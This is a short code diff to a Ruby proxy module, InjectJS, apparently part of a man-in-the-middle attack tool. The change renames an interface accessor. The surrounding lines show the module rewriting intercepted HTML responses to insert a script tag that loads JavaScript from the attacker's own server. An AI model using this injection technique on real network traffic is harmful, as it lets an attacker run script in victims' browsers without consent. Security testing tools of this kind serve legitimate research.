@@ -135,7 +135,7 @@ class InjectJS < Proxy::Module
     if response.content_type == 'text/html'
       Logger.info "Injecting javascript file into http://#{request.host}#{request.url} page"
       # get the local interface address and HTTPD port
-      localaddr = Context.get.iface[:ip_saddr]
+      localaddr = Context.get.ifconfig[:ip_saddr]
       localport = Context.get.options[:httpd_port]
       # inject the js
       response.body.sub!( '</title>', "</title><script src='http://#{localaddr}:#{localport}/file.js' type='text/javascript'></script>" )
